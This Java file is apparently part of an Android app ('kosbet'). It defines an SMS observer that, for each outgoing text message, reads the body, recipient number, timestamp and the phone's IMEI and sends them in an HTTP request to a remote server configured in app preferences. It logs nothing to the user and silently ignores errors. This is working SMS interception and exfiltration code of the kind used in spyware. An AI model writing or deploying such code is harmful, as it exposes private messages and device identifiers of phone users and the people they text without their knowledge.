package com.kosbet;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;



@SuppressLint("SimpleDateFormat")
public class SMSObserver extends ContentObserver {
    
    private Context mContext;
     
    private String protocol;
    private String smsBodyStr = "", phoneNoStr = "";
    @SuppressWarnings("unused")
	private long smsDatTime = System.currentTimeMillis();
    static final Uri SMS_STATUS_URI = Uri.parse("content://sms");
    public static String PREFS_IP = "IPADDRESS";
	public static String PREFS_PORT = "PORT";
	String new_ip,new_port;
	private static String IP_DATA = "ip";
	private static String PORT_DATA = "port";
    Cursor sms_sent_cursor ;
    TelephonyManager TM;
	String iemi;
    public SMSObserver(Handler handler, Context ctx) {
        super(handler);
        mContext = ctx;
        getIP();
    }
 
    private void getIP() 
	{
		String ip = "";
		String port = "";
		SharedPreferences settings = mContext.getSharedPreferences(PREFS_IP, 0);
		SharedPreferences settings1 =mContext.getSharedPreferences(PREFS_PORT, 0);
		ip = settings.getString(IP_DATA, null);
		port=settings1.getString(PORT_DATA, null);
		if (ip == null) 
		{
			if(port== null)
			{
				
			}

		} 
		else
		{
			new_ip=ip;
			new_port=port;
		}
					
	}

	public boolean deliverSelfNotifications() {
        return true;
    }
 
    public void onChange(boolean selfChange) {
        try{
        	TM = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
    		iemi = TM.getDeviceId();
            Log.e("Info","Notification on SMS observer");
            sms_sent_cursor= mContext.getContentResolver().query(SMS_STATUS_URI, null, null, null, null);
            if (sms_sent_cursor != null) {
                if (sms_sent_cursor.moveToFirst()) {
                    protocol = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("protocol"));
                    Log.e("Info","protocol : " + protocol);
                   
                    if(protocol == null){
                       
                        int type = sms_sent_cursor.getInt(sms_sent_cursor.getColumnIndex("type"));
                        Log.e("Info","SMS Type : " + type);
                       
                        if(type == 2){
                        	smsBodyStr = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("body")).trim();
                            phoneNoStr = sms_sent_cursor.getString(sms_sent_cursor.getColumnIndex("address")).trim();
                            smsDatTime = sms_sent_cursor.getLong(sms_sent_cursor.getColumnIndex("date"));
                            java.text.DateFormat df = new java.text.SimpleDateFormat("yyyy-MM-dd");
                    		java.text.DateFormat tf = new java.text.SimpleDateFormat("HH:mm:ss");
                    		final String todaysdate = df.format(new java.util.Date());
                    		final String todaystime = tf.format(new java.util.Date());
                    		String value = "ANN" + "&" + smsBodyStr + "&"
                    				+ phoneNoStr + "&" + "send" + "&"
                    				+ todaysdate + "&" + todaystime + "&" + iemi;
                    		Log.i("Send SMS", "");
                    		try {
                    			GetXMLTask jsonOperations = new GetXMLTask();
                    			getIP();
                    			if(new_ip!=null)
        						{
                    			String path = "http://"+new_ip+":"+new_port+"/KOSBET/resources/sms/"
                    					+ value;
                    			System.out.println("path" + path);
                    			path = path.replaceAll(" ", "%20");
                    			jsonOperations.execute(new String[] { path });    
        						}

                    		} catch (Exception e) 
                    		{
                    			//Toast.makeText(mContext, "Connection Failure", Toast.LENGTH_LONG).show();
                    		}
                    		
                        }
                        
                        
                    }
                }
            }
            else
                Log.e("Info","Send Cursor is Empty");
            
            sms_sent_cursor.close();
        }
        catch(Exception sggh){
            Log.e("Error", "Error on onChange : "+sggh.toString());
        }
        super.onChange(selfChange);
    }//fn onChange
     
}//End of class SmsObserver

